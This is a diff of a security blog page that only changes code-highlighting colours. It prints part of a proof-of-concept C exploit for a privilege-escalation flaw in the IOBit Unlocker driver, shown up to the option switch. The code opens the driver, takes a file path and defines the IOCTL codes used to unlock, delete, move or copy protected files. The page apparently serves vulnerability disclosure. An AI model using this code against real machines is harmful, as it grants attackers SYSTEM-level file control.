@@ -58,7 +58,7 @@ With “Unlock &amp; Delete”, “Unlock &amp; Rename”, “Unlock &amp; Move�
 
   
   
-  <link rel="stylesheet" href="https://theevilbit.github.io/css/coder.min.b886fe0d9034709648f91f4ce178f51dd367d9350f82dd1132d54fd69bfca66f.css" integrity="sha256-uIb&#43;DZA0cJZI&#43;R9M4Xj1HdNn2TUPgt0RMtVP1pv8pm8=" crossorigin="anonymous" media="screen" />
+  <link rel="stylesheet" href="https://theevilbit.github.io/css/coder.min.4410e480b3bad72c110a96b56e5aa8c36c24a0f3735b278818123b0fa4393fcd.css" integrity="sha256-RBDkgLO61ywRCpa1blqow2wkoPNzWyeIGBI7D6Q5P80=" crossorigin="anonymous" media="screen" />
 
 
 
@@ -297,168 +297,168 @@ I believe the 4 byte return value is the NTSTATUS code. If we select a folder in
 <p>The possibilities are endless with these capabilities. For example we can easily replace any binary running as SYSTEM, or copy a DLL to a location where it will be loaded as SYSTEM.</p>
 <p>The only item that doesn’t work is renaming the file, for some reason if the user doesn’t have rights, the driver can’t rename it. All other items work.</p>
 <p>Proof-of-concept C code:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// UnlockExploit.cpp : This file contains the &#39;main&#39; function. Program execution begins and ends there.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">FileExists</span>(LPCWSTR szPath)
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// UnlockExploit.cpp : This file contains the &#39;main&#39; function. Program execution begins and ends there.
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">//
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;iostream&gt;</span><span style="color:#099">
+</span></span></span><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;windows.h&gt;</span><span style="color:#099">
+</span></span></span><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;stdio.h&gt;</span><span style="color:#099">
+</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>
+</span></span><span style="display:flex;"><span>BOOL <span style="color:#c0f">FileExists</span>(LPCWSTR szPath)
 </span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>	DWORD dwAttrib <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetFileAttributesW</span>(szPath);
-</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[i] File exists status: 0x%08x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, dwAttrib);
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> (dwAttrib <span style="color:#f92672">!=</span> INVALID_FILE_ATTRIBUTES);
+</span></span><span style="display:flex;"><span>	DWORD dwAttrib <span style="color:#555">=</span> <span style="color:#c0f">GetFileAttributesW</span>(szPath);
+</span></span><span style="display:flex;"><span>	<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[i] File exists status: 0x%08x</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>, dwAttrib);
+</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">return</span> (dwAttrib <span style="color:#555">!=</span> INVALID_FILE_ATTRIBUTES);
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ReadStringFromSTDIN</span>(<span style="color:#66d9ef">wchar_t</span> <span style="color:#f92672">*</span> buffer)
+</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">ReadStringFromSTDIN</span>(<span style="color:#078;font-weight:bold">wchar_t</span> <span style="color:#555">*</span> buffer)
 </span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;&gt; &#34;</span>);
-</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fgetws</span>((<span style="color:#66d9ef">wchar_t</span><span style="color:#f92672">*</span>)buffer, <span style="color:#ae81ff">0x200</span>, stdin);
-</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">memset</span>((LPVOID)((SIZE_T)buffer <span style="color:#f92672">+</span> (<span style="color:#a6e22e">lstrlenW</span>((LPCWSTR)buffer) <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(WCHAR) <span style="color:#f92672">-</span> <span style="color:#66d9ef">sizeof</span>(WCHAR))), <span style="color:#ae81ff">0x00</span>, <span style="color:#66d9ef">sizeof</span>(WCHAR)); <span style="color:#75715e">//remove end of line character
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span><span style="display:flex;"><span>	<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#c0f">fgetws</span>((<span style="color:#078;font-weight:bold">wchar_t</span><span style="color:#555">*</span>)buffer, <span style="color:#f60">0x200</span>, stdin);
+</span></span><span style="display:flex;"><span>	<span style="color:#c0f">memset</span>((LPVOID)((SIZE_T)buffer <span style="color:#555">+</span> (<span style="color:#c0f">lstrlenW</span>((LPCWSTR)buffer) <span style="color:#555">*</span> <span style="color:#069;font-weight:bold">sizeof</span>(WCHAR) <span style="color:#555">-</span> <span style="color:#069;font-weight:bold">sizeof</span>(WCHAR))), <span style="color:#f60">0x00</span>, <span style="color:#069;font-weight:bold">sizeof</span>(WCHAR)); <span style="color:#09f;font-style:italic">//remove end of line character
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>}
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[]) {
-</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[i] IOBit Unlocker Privilege Escalation PoC</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">int</span> <span style="color:#c0f">main</span>(<span style="color:#078;font-weight:bold">int</span> argc, <span style="color:#078;font-weight:bold">char</span><span style="color:#555">*</span> argv[]) {
+</span></span><span style="display:flex;"><span>	<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[i] IOBit Unlocker Privilege Escalation PoC</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//open the driver
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	HANDLE hDriver <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileW</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">IOBitUnlockerDevice&#34;</span>, GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE, <span style="color:#ae81ff">0</span>, NULL, OPEN_EXISTING, <span style="color:#ae81ff">0</span>, NULL);
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (hDriver <span style="color:#f92672">!=</span> INVALID_HANDLE_VALUE)
+</span></span><span style="display:flex;"><span>	<span style="color:#09f;font-style:italic">//open the driver
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>	HANDLE hDriver <span style="color:#555">=</span> <span style="color:#c0f">CreateFileW</span>(<span style="color:#c30">L</span><span style="color:#c30">&#34;</span><span style="color:#c30;font-weight:bold">\\\\</span><span style="color:#c30">.</span><span style="color:#c30;font-weight:bold">\\</span><span style="color:#c30">IOBitUnlockerDevice&#34;</span>, GENERIC_READ <span style="color:#555">|</span> GENERIC_WRITE, <span style="color:#f60">0</span>, <span style="color:#366">NULL</span>, OPEN_EXISTING, <span style="color:#f60">0</span>, <span style="color:#366">NULL</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">if</span> (hDriver <span style="color:#555">!=</span> INVALID_HANDLE_VALUE)
 </span></span><span style="display:flex;"><span>	{
-</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] opened handle to the driver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[+] opened handle to the driver</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		DWORD input_buffer_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>;
-</span></span><span style="display:flex;"><span>		DWORD output_buffer_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>;
-</span></span><span style="display:flex;"><span>		<span style="color:#75715e">//allocate input buffer
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		LPVOID input_buffer <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>(NULL, (SIZE_T)input_buffer_size, MEM_RESERVE <span style="color:#f92672">|</span> MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (input_buffer <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>		DWORD input_buffer_size <span style="color:#555">=</span> <span style="color:#f60">0x1000</span>;
+</span></span><span style="display:flex;"><span>		DWORD output_buffer_size <span style="color:#555">=</span> <span style="color:#f60">0x1000</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#09f;font-style:italic">//allocate input buffer
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>		LPVOID input_buffer <span style="color:#555">=</span> <span style="color:#c0f">VirtualAlloc</span>(<span style="color:#366">NULL</span>, (SIZE_T)input_buffer_size, MEM_RESERVE <span style="color:#555">|</span> MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">if</span> (input_buffer <span style="color:#555">==</span> <span style="color:#366">NULL</span>)
 </span></span><span style="display:flex;"><span>		{
-</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Unable to allocate memory for input buffer</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">ExitProcess</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[-] Unable to allocate memory for input buffer</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#c0f">ExitProcess</span>(<span style="color:#555">-</span><span style="color:#f60">1</span>);
 </span></span><span style="display:flex;"><span>		}
-</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Allocated input memory buffer at: 0x%Ix</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (UINT64)input_buffer);
+</span></span><span style="display:flex;"><span>		<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[+] Allocated input memory buffer at: 0x%Ix</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>, (UINT64)input_buffer);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		<span style="color:#75715e">//allocate output buffer
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		LPVOID output_buffer <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>(NULL, (SIZE_T)output_buffer_size, MEM_RESERVE <span style="color:#f92672">|</span> MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (output_buffer <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>		<span style="color:#09f;font-style:italic">//allocate output buffer
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>		LPVOID output_buffer <span style="color:#555">=</span> <span style="color:#c0f">VirtualAlloc</span>(<span style="color:#366">NULL</span>, (SIZE_T)output_buffer_size, MEM_RESERVE <span style="color:#555">|</span> MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">if</span> (output_buffer <span style="color:#555">==</span> <span style="color:#366">NULL</span>)
 </span></span><span style="display:flex;"><span>		{
-</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Unable to allocate memory for output buffer</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">ExitProcess</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[-] Unable to allocate memory for output buffer</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#c0f">ExitProcess</span>(<span style="color:#555">-</span><span style="color:#f60">1</span>);
 </span></span><span style="display:flex;"><span>		}
-</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Allocated output buffer memory at: 0x%Ix</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (UINT64)output_buffer);
+</span></span><span style="display:flex;"><span>		<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[+] Allocated output buffer memory at: 0x%Ix</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>, (UINT64)output_buffer);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Clear memory area
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">memset</span>(input_buffer, <span style="color:#ae81ff">0x00</span>, input_buffer_size); 
-</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">memset</span>(output_buffer, <span style="color:#ae81ff">0x00</span>, output_buffer_size);
+</span></span><span style="display:flex;"><span>		<span style="color:#09f;font-style:italic">// Clear memory area
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>		<span style="color:#c0f">memset</span>(input_buffer, <span style="color:#f60">0x00</span>, input_buffer_size); 
+</span></span><span style="display:flex;"><span>		<span style="color:#c0f">memset</span>(output_buffer, <span style="color:#f60">0x00</span>, output_buffer_size);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[i] Enter full path for the file to unlock. Eg: C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">System32</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">cmd.exe</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">ReadStringFromSTDIN</span>((<span style="color:#66d9ef">wchar_t</span><span style="color:#f92672">*</span>)input_buffer);
-</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">wprintf</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Fileto be checked: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">wchar_t</span> <span style="color:#f92672">*</span>)input_buffer);
+</span></span><span style="display:flex;"><span>		<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[i] Enter full path for the file to unlock. Eg: C:</span><span style="color:#c30;font-weight:bold">\\</span><span style="color:#c30">Windows</span><span style="color:#c30;font-weight:bold">\\</span><span style="color:#c30">System32</span><span style="color:#c30;font-weight:bold">\\</span><span style="color:#c30">cmd.exe</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#c0f">ReadStringFromSTDIN</span>((<span style="color:#078;font-weight:bold">wchar_t</span><span style="color:#555">*</span>)input_buffer);
+</span></span><span style="display:flex;"><span>		<span style="color:#c0f">wprintf</span>(<span style="color:#c30">L</span><span style="color:#c30">&#34;Fileto be checked: %s</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>, (<span style="color:#078;font-weight:bold">wchar_t</span> <span style="color:#555">*</span>)input_buffer);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">FileExists</span>((LPCWSTR)input_buffer)) {
-</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] This file doesn&#39;t exists</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">ExitProcess</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">!</span><span style="color:#c0f">FileExists</span>((LPCWSTR)input_buffer)) {
+</span></span><span style="display:flex;"><span>			<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[-] This file doesn&#39;t exists</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#c0f">ExitProcess</span>(<span style="color:#555">-</span><span style="color:#f60">1</span>);
 </span></span><span style="display:flex;"><span>		}
-</span></span><span style="display:flex;"><span>		<span style="color:#75715e">//print options
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] File found!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[i] Choose an option:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;1 - INFO</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;2 - Unlock</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;3 - Unlock &amp; Delete</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;4 - Unlock &amp; Rename</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;5 - Unlock &amp; Move</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;6 - Unlock &amp; Copy</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#09f;font-style:italic">//print options
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>		<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[+] File found!</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[i] Choose an option:</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;1 - INFO</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;2 - Unlock</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;3 - Unlock &amp; Delete</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;4 - Unlock &amp; Rename</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;5 - Unlock &amp; Move</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;6 - Unlock &amp; Copy</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
 </span></span><span style="display:flex;"><span>		
-</span></span><span style="display:flex;"><span>		boolean valid <span style="color:#f92672">=</span> false;
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">int</span> option <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">while</span> (<span style="color:#f92672">!</span>valid)
+</span></span><span style="display:flex;"><span>		boolean valid <span style="color:#555">=</span> <span style="color:#366">false</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#078;font-weight:bold">int</span> option <span style="color:#555">=</span> <span style="color:#f60">0</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">while</span> (<span style="color:#555">!</span>valid)
 </span></span><span style="display:flex;"><span>		{
-</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;&gt; &#34;</span>);
-</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">int</span> result <span style="color:#f92672">=</span> <span style="color:#a6e22e">scanf_s</span>(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>option);
-</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (result <span style="color:#f92672">==</span> EOF) {
-</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Invalid input</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#078;font-weight:bold">int</span> result <span style="color:#555">=</span> <span style="color:#c0f">scanf_s</span>(<span style="color:#c30">&#34;%d&#34;</span>, <span style="color:#555">&amp;</span>option);
+</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">if</span> (result <span style="color:#555">==</span> EOF) {
+</span></span><span style="display:flex;"><span>				<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[-] Invalid input</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
+</span></span><span style="display:flex;"><span>				<span style="color:#069;font-weight:bold">continue</span>;
 </span></span><span style="display:flex;"><span>			}
-</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (result <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
-</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">fgetc</span>(stdin) <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;\n&#39;</span>) <span style="color:#75715e">// Read until a newline is found
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>					;
-</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Invalid input</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">if</span> (result <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
+</span></span><span style="display:flex;"><span>				<span style="color:#069;font-weight:bold">while</span> (<span style="color:#c0f">fgetc</span>(stdin) <span style="color:#555">!=</span> <span style="color:#c30">&#39;\n&#39;</span>) <span style="color:#09f;font-style:italic">// Read until a newline is found
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>					;
+</span></span><span style="display:flex;"><span>				<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[-] Invalid input</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
+</span></span><span style="display:flex;"><span>				<span style="color:#069;font-weight:bold">continue</span>;
 </span></span><span style="display:flex;"><span>			}
 </span></span><span style="display:flex;"><span>			
-</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (option <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> option <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">7</span>)
+</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">if</span> (option <span style="color:#555">&gt;</span> <span style="color:#f60">0</span> <span style="color:#555">&amp;&amp;</span> option <span style="color:#555">&lt;</span> <span style="color:#f60">7</span>)
 </span></span><span style="display:flex;"><span>			{
-</span></span><span style="display:flex;"><span>				valid <span style="color:#f92672">=</span> true;
-</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">fgetc</span>(stdin) <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;\n&#39;</span>) <span style="color:#75715e">// Read until a newline is found, if we don&#39;t do this it will mess up code later
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>					;
+</span></span><span style="display:flex;"><span>				valid <span style="color:#555">=</span> <span style="color:#366">true</span>;
+</span></span><span style="display:flex;"><span>				<span style="color:#069;font-weight:bold">while</span> (<span style="color:#c0f">fgetc</span>(stdin) <span style="color:#555">!=</span> <span style="color:#c30">&#39;\n&#39;</span>) <span style="color:#09f;font-style:italic">// Read until a newline is found, if we don&#39;t do this it will mess up code later
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>					;
 </span></span><span style="display:flex;"><span>			}
-</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">else</span>
 </span></span><span style="display:flex;"><span>			{
-</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Invalid number, enter something between 1 and 6</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>				<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[-] Invalid number, enter something between 1 and 6</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
 </span></span><span style="display:flex;"><span>			}
 </span></span><span style="display:flex;"><span>		}
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		DWORD dwIoctl_info <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x222128</span>;
-</span></span><span style="display:flex;"><span>		DWORD dwIoctl_action <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x222124</span>;
-</span></span><span style="display:flex;"><span>		DWORD dwBytesOut <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">switch</span> (option)
+</span></span><span style="display:flex;"><span>		DWORD dwIoctl_info <span style="color:#555">=</span> <span style="color:#f60">0x222128</span>;
+</span></span><span style="display:flex;"><span>		DWORD dwIoctl_action <span style="color:#555">=</span> <span style="color:#f60">0x222124</span>;
+</span></span><span style="display:flex;"><span>		DWORD dwBytesOut <span style="color:#555">=</span> <span style="color:#f60">0</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">switch</span> (option)
 </span></span><span style="display:flex;"><span>		{
